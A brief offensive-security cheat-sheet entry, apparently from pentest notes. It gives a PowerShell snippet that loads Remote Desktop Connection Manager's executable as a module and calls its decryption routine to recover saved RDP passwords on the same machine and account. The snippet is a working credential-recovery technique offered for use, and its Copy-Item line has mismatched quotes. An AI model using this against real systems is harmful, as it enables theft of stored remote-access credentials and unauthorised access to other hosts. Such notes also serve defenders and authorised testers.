# RDP Password Decryption

<mark style="color:green;">**Remote Desktop Connection Manager passwords can be decrypted on the same computer/account they were encrypted**</mark>:

```powershell
Copy-Item 'C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll’
Import-Module C:\temp\RDCMan.dll
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)
```
